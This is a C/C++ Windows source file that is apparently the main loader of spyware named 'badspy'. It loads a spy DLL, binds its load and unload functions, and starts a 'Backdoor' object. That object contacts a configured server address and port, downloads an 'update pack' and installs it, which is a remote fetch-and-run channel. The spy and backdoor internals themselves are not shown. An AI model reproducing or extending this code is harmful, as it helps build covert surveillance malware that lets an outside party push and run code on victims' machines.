#include <stdio.h>
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include "proc.h"
#include "main.h"
#include "bdr\backdoor.h"
#include "../../log-cpp/log.h"
#include <Gdiplus.h>
#include <Shlwapi.h>
#define ERROR_CODE 1
#define OK_CODE 1

HMODULE badspyModule = NULL;
HMODULE badspyDllModule = NULL;
Backdoor * backdoor = NULL;

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	if (!init_library())
	{
		LOG_E("Can not load dll library");
		return ERROR_CODE;
	}
	
	if (!init_dll_func())
	{
		free_library();
		LOG_E("Can not bind dll functions");
		return ERROR_CODE;
	}
	
	/*if (load_spy())
	{
		free_library();
		LOG_E("Can not load spy!");
		return ERROR_CODE;
	}*/

	LOG_I("Spy is running...");

	LOG_I("Initializing backdoor...");
	init_backdoor();

	bool update_available = false;
	if (backdoor != NULL)
	{
		LOG_I("Checking for update available...");
		if (check_and_dwnl_update())
		{
			LOG_I("Update pack is available, exit to install this pack");
			update_available = true;
		}
	}
	
	if (!update_available)
		start_looper();
	
	LOG_I("Spy is stopping...");

	unload_spy();

	if (update_available)
	{
		LOG_I("Installing update pack...");
		install_update_pack();
	}

	free_backdoor();

	LOG_I("Exited!");
	return OK_CODE;
}

void start_looper()
{
	LOG("Start looper");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	LOG("Stop looper");
}

bool init_library()
{
	LOG("Loading dll library");
	if ((badspyDllModule = LoadLibraryA("badspy.c.dll")) == NULL)
		return false;
	if ((badspyModule = GetModuleHandleA("badspy.c.dll")) == NULL)
		return false;
	LOG("Loaded dll library");
	return true;
}

bool init_dll_func()
{
	LOG("Loading dll functions");
	if ((load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy")) == NULL)
		return false;
	if ((unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy")) == NULL)
		return false;
	if ((path_combine = (PATH_COMBINE)GetProcAddress(badspyModule, "?path_combine@Spy@@CAXPADPBD1@Z")) == NULL)
		return false;
	LOG("loaded dll functions");
	return true;
}

void free_library()
{
	LOG("Free dll library");
	if (badspyDllModule != NULL)
	{
		FreeLibrary(badspyDllModule);
		badspyDllModule = NULL;
	}
}

void init_backdoor()
{
	char * exe_path = new char[MAX_PATH];
	if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) > 0)
	{
		char * last_file_separator = strrchr(exe_path, '\\');
		*(last_file_separator + 1) = '\0';
		const char * root_dir = exe_path;
		char * working_dir = new char[MAX_PATH];
		strcpy(working_dir, root_dir);
		strcat(working_dir, SPY_DWL_TMP_DIR_NAME);
		try
		{
			backdoor = new Backdoor(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_DWL_PORT, working_dir, root_dir);
		}
		catch (int error)
		{
			LOG_E("Error when create backdoor: %d", error);
		}
		catch (...)
		{
			LOG_E("Unhandled exception!");
		}
		delete[] working_dir;
	}
	delete[] exe_path;
}

void free_backdoor()
{
	if (backdoor != NULL)
	{
		delete backdoor;
	}
}

bool check_and_dwnl_update()
{
	try
	{
		return backdoor->check_and_dwnl_update();
	}
	catch (int error)
	{
		LOG_E("Error when check and download update pack: %d", error);
	}
	catch (...)
	{
		LOG_E("Unhandled exception!");
	}
	return false;
}

void install_update_pack()
{
	backdoor->install_update_pack();
}